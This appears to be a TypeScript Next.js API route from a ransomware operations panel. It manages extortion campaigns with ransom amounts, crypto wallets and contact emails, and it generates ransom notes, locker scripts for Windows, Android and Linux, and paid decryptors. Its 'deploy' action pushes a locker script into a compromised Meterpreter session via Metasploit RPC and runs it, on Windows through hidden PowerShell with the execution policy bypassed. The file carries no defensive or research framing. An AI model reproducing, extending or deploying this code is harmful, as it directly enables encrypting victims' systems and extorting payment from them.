import { NextResponse } from "next/server";
import { isAuthorized } from "@/lib/auth";
import {
  createCampaign,
  listCampaigns,
  getCampaign,
  updateCampaign,
  deleteCampaign,
  getLockerStatus,
  generateRansomNote,
  generateLockerScript,
  generateAndroidLockerScript,
  generateLinuxLockerScript,
  generateDecryptorScript,
  recoverPrivateKey,
} from "@/lib/locker";
import { getRpcToken, rpcCall } from "@/lib/msf-rpc";
import fs from "fs";
import path from "path";
import os from "os";

export async function GET(request: Request) {
  if (!isAuthorized(request)) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const url = new URL(request.url);
  const action = url.searchParams.get("action");

  try {
    if (action === "status") {
      return NextResponse.json(getLockerStatus());
    }
    if (action === "list") {
      return NextResponse.json({ campaigns: listCampaigns() });
    }
    if (action === "get") {
      const id = url.searchParams.get("id");
      if (!id) return NextResponse.json({ error: "id required" }, { status: 400 });
      const campaign = getCampaign(id);
      if (!campaign) return NextResponse.json({ error: "Campaign not found" }, { status: 404 });
      return NextResponse.json({ campaign });
    }
    if (action === "note") {
      const id = url.searchParams.get("id");
      const ip = url.searchParams.get("ip") || "0.0.0.0";
      const device = url.searchParams.get("device") || "unknown";
      const customNote = url.searchParams.get("customNote") || "";
      if (!id) return NextResponse.json({ error: "id required" }, { status: 400 });
      const campaign = getCampaign(id);
      if (!campaign) return NextResponse.json({ error: "Campaign not found" }, { status: 404 });
      const note = generateRansomNote(campaign, { ip, device, customNote });
      return NextResponse.json({ note });
    }
    if (action === "script") {
      const id = url.searchParams.get("id");
      if (!id) return NextResponse.json({ error: "id required" }, { status: 400 });
      const script = generateLockerScript(id);
      return new NextResponse(script, {
        headers: { "Content-Type": "text/plain" },
      });
    }
    if (action === "recover-key") {
      const id = url.searchParams.get("id");
      const code = url.searchParams.get("code");
      if (!id || !code) return NextResponse.json({ error: "id and code required" }, { status: 400 });
      const key = recoverPrivateKey(id, code);
      if (!key) return NextResponse.json({ error: "Invalid unlock code" }, { status: 403 });
      return NextResponse.json({ privateKey: key, campaignId: id });
    }
    if (action === "android-script") {
      const id = url.searchParams.get("id");
      if (!id) return NextResponse.json({ error: "id required" }, { status: 400 });
      const script = generateAndroidLockerScript(id);
      return new NextResponse(script, { headers: { "Content-Type": "text/plain" } });
    }
    if (action === "linux-script") {
      const id = url.searchParams.get("id");
      if (!id) return NextResponse.json({ error: "id required" }, { status: 400 });
      const script = generateLinuxLockerScript(id);
      return new NextResponse(script, { headers: { "Content-Type": "text/plain" } });
    }
    if (action === "decryptor") {
      const id = url.searchParams.get("id");
      const code = url.searchParams.get("code");
      if (!id || !code) return NextResponse.json({ error: "id and code required" }, { status: 400 });
      const privKey = recoverPrivateKey(id, code);
      if (!privKey) return NextResponse.json({ error: "Invalid unlock code" }, { status: 403 });
      const decryptor = generateDecryptorScript(id, privKey);
      return new NextResponse(decryptor, { headers: { "Content-Type": "text/plain" } });
    }
    return NextResponse.json({ error: "Unknown action" }, { status: 400 });
  } catch (error) {
    return NextResponse.json(
      { error: error instanceof Error ? error.message : "Failed" },
      { status: 502 },
    );
  }
}

export async function POST(request: Request) {
  if (!isAuthorized(request)) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  try {
    const body = await request.json();
    const { action } = body;

    if (action === "create") {
      const campaign = createCampaign(body.name || "Unnamed Campaign", {
        ransomAmount: body.ransomAmount,
        walletAddress: body.walletAddress,
        contactEmail: body.contactEmail,
        noteTemplate: body.noteTemplate,
        extensions: body.extensions,
        targets: body.targets,
        deviceNotes: body.deviceNotes,
      });
      return NextResponse.json({ campaign });
    }

    if (action === "update") {
      const updated = updateCampaign(body.id, body.updates);
      if (!updated) return NextResponse.json({ error: "Campaign not found" }, { status: 404 });
      return NextResponse.json({ campaign: updated });
    }

    if (action === "delete") {
      const ok = deleteCampaign(body.id);
      return NextResponse.json({ deleted: ok });
    }

    if (action === "set-device-note") {
      // Store a custom note for a specific IP or device name
      const campaign = getCampaign(body.id);
      if (!campaign) return NextResponse.json({ error: "Campaign not found" }, { status: 404 });
      const notes = { ...campaign.deviceNotes, [body.key]: body.note };
      const updated = updateCampaign(body.id, { deviceNotes: notes });
      return NextResponse.json({ campaign: updated });
    }

    if (action === "mark-deployed") {
      const updated = updateCampaign(body.id, { deployed: true });
      return NextResponse.json({ campaign: updated });
    }

    // ── Live MSF deployment ──────────────────────────────────────────
    // Uploads the locker script to the victim session and executes it.
    if (action === "deploy") {
      const { id: campaignId, session_id, platform, custom_note, target_ip, device_name } = body as {
        id: string; session_id: number; platform?: string;
        custom_note?: string; target_ip?: string; device_name?: string;
      };

      if (!campaignId || !session_id) {
        return NextResponse.json({ error: "id + session_id required" }, { status: 400 });
      }

      const campaign = getCampaign(campaignId);
      if (!campaign) return NextResponse.json({ error: "Campaign not found" }, { status: 404 });

      const token = await getRpcToken();
      const sid = Number(session_id);

      // Determine platform from session info if not provided
      let detectedPlatform = platform ?? "windows";
      try {
        const sessList = await rpcCall<Record<string, unknown>>("session.list", [], token);
        const sessInfo = (sessList[String(sid)] ?? {}) as Record<string, unknown>;
        const pl = String(sessInfo.platform ?? "").toLowerCase();
        if (pl.includes("android") || pl.includes("linux")) detectedPlatform = pl.includes("android") ? "android" : "linux";
        else if (pl.includes("windows")) detectedPlatform = "windows";
      } catch { /* ignore */ }

      // Generate appropriate script
      let script: string;
      let scriptName: string;
      let execCmd: string;

      if (detectedPlatform === "android") {
        script = generateAndroidLockerScript(campaignId);
        scriptName = `locker_${campaignId}.sh`;
        execCmd = `execute -f /system/bin/sh -a '/data/local/tmp/${scriptName}'`;
      } else if (detectedPlatform === "linux") {
        script = generateLinuxLockerScript(campaignId);
        scriptName = `locker_${campaignId}.sh`;
        execCmd = `execute -f /bin/bash -a '/tmp/${scriptName}'`;
      } else {
        script = generateLockerScript(campaignId);
        scriptName = `locker_${campaignId}.ps1`;
        execCmd = `execute -H -f powershell.exe -a "-ExecutionPolicy Bypass -NonInteractive -File C:\\Windows\\Temp\\${scriptName} -TargetIP ${target_ip ?? ''} -DeviceName ${device_name ?? ''} -CustomNote '${custom_note ?? ''}'"`;
      }

      // Write script to temp file
      const tmpDir = os.tmpdir();
      const localScript = path.join(tmpDir, scriptName);
      fs.writeFileSync(localScript, script, "utf8");

      // Upload via Meterpreter file upload
      const remotePath = detectedPlatform === "windows"
        ? `C:\\Windows\\Temp\\${scriptName}`
        : detectedPlatform === "android"
          ? `/data/local/tmp/${scriptName}`
          : `/tmp/${scriptName}`;

      await rpcCall("session.meterpreter_write", [sid, `upload "${localScript}" "${remotePath}"\n`], token);
      await new Promise((r) => setTimeout(r, 3000));

      // Make executable on unix
      if (detectedPlatform !== "windows") {
        await rpcCall("session.meterpreter_write", [sid, `execute -f /bin/chmod -a '+x ${remotePath}'\n`], token);
        await new Promise((r) => setTimeout(r, 1000));
      }

      // Execute
      await rpcCall("session.meterpreter_write", [sid, execCmd + "\n"], token);

      // Mark as deployed
      updateCampaign(campaignId, { deployed: true });

      // Clean up local temp file
      try { fs.unlinkSync(localScript); } catch { /* ignore */ }

      return NextResponse.json({
        ok: true,
        data: { platform: detectedPlatform, remotePath, campaignId, sessionId: sid },
      });
    }

    return NextResponse.json({ error: "Unknown action" }, { status: 400 });
  } catch (error) {
    return NextResponse.json(
      { error: error instanceof Error ? error.message : "Failed" },
      { status: 502 },
    );
  }
}
